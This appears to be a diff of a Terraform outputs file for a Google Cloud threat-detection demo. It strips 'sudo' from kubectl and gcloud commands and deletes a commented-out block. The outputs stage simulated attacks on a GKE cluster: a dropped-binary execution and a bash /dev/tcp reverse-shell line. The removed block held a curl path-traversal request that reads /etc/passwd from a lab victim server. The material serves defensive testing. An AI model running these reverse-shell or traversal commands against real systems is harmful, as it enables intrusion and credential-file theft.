@@ -29,84 +29,17 @@ output "_02_iap_ssh_gke_proxy" {
 
 
 output "_03_gke_get_credential" {
-  value = "sudo gcloud container clusters get-credentials ${local.cluster_name} --zone=us-east1 --project=${var.demo_project_id}${random_string.id.result}"
+  value = "gcloud container clusters get-credentials ${local.cluster_name} --zone=us-east1 --project=${var.demo_project_id}${random_string.id.result};export USE_GKE_GCLOUD_AUTH_PLUGIN=True"
 }
 
 
 output "_04_binary_executed_attack" {
-  value = "sudo kubectl run --restart=Never --rm=true --wait=true -i  --image marketplace.gcr.io/google/ubuntu1804:latest dropped-binary-$(date -u +%Y-%m-%d-%H-%M-%S-utc) -- bash -c 'cp /bin/ls /tmp/dropped-binary-$(date -u +%Y-%m-%d-%H-%M-%S-utc); /tmp/dropped-binary-$(date -u +%Y-%m-%d-%H-%M-%S-utc)'"
+  value = "kubectl run --restart=Never --rm=true --wait=true -i  --image marketplace.gcr.io/google/ubuntu1804:latest dropped-binary-$(date -u +%Y-%m-%d-%H-%M-%S-utc) -- bash -c 'cp /bin/ls /tmp/dropped-binary-$(date -u +%Y-%m-%d-%H-%M-%S-utc); /tmp/dropped-binary-$(date -u +%Y-%m-%d-%H-%M-%S-utc)'"
 }
 
 
 output "_05_reverse_shell" {
-  value = "sudo kubectl run --restart=Never --rm=true --wait=true -i  --image marketplace.gcr.io/google/ubuntu1804:latest reverse-shell-$(date -u +%Y-%m-%d-%H-%M-%S-utc) -- bash -c '/bin/echo >& /dev/tcp/8.8.8.8/53 0>&1'"
+  value = "kubectl run --restart=Never --rm=true --wait=true -i  --image marketplace.gcr.io/google/ubuntu1804:latest reverse-shell-$(date -u +%Y-%m-%d-%H-%M-%S-utc) -- bash -c '/bin/echo >& /dev/tcp/8.8.8.8/53 0>&1'"
 }
 
 
-/*
-output "_03_ids_project_id" {
-  value = module.ids_deploy.ids_project_id
-}
-
-
-
-output "_02_ids_project_id" {
-  value = module.ids_deploy.ids_project_id
-}
-
-
-output "_03_appmod_project_id" {
-  value = module.appmod_deploy.appmod_project_id
-}
-output "_04_dlp_vpcsc_project_id" {
-  value = module.dlp_deploy.dlp_project_id
-}
-
-
-output "_05_ids_victim_server_ip" {
-  value = "IDS victim server ip - 192.168.10.20"
- 
-}
-
-output "_06_ids_attacker_server" {
-  value = "IDS attacker server ip - 192.168.10.10"
- 
-}
-
-
-output "_07_ids_iap_ssh_attacker_server" {
-  value = "gcloud compute ssh --zone ${var.network_zone} ${module.ids_deploy.ids_attacker_machine}  --tunnel-through-iap --project ${module.ids_deploy.ids_project_id}"
- }
-
-output "_08_ids_sample_attack_command" {
-  value = "curl http://192.168.10.20/cgi-bin/../../../..//bin/cat%20/etc/passwd"
- }
-
-
-
-output "_09_start_sql_proxy_ssh_tunnel" {
-  value = "gcloud compute ssh ${google_compute_instance.sql_proxy_server.name} --project ${var.demo_project_id}${random_string.id.result} --zone ${var.network_zone} --tunnel-through-iap"
-}
-
-output "_10_sql_instance_connection_name" {
-  value = google_sql_database_instance.private_sql_instance.connection_name
-}
-
-output "_11_initiate_sql_listner_connection" {
-  value = "cloud_sql_proxy -instances=${var.demo_project_id}${random_string.id.result}:${var.network_region}:sql-instance=tcp:0.0.0.0:5432"
-}
-   
-  output "_12_retrieve_db_username" {
-  value = "gcloud secrets versions access ${google_secret_manager_secret_version.sql_db_user_name.id} --secret ${google_secret_manager_secret.sql_db_user_name.id}"
-}
-   
- output "_13_retrieve_db_password" {
-  value = "gcloud secrets versions access ${google_secret_manager_secret_version.sql_db_user_password.id} --secret ${google_secret_manager_secret.sql_db_user_password.id}"
-}
-   
-output "_14_sql_client_command" {
-  value = "psql \"host=127.0.0.1 port=5432 sslmode=disable dbname=${google_sql_database.records_db.name} user=USERNAME\""
- 
-}  
-
-*/
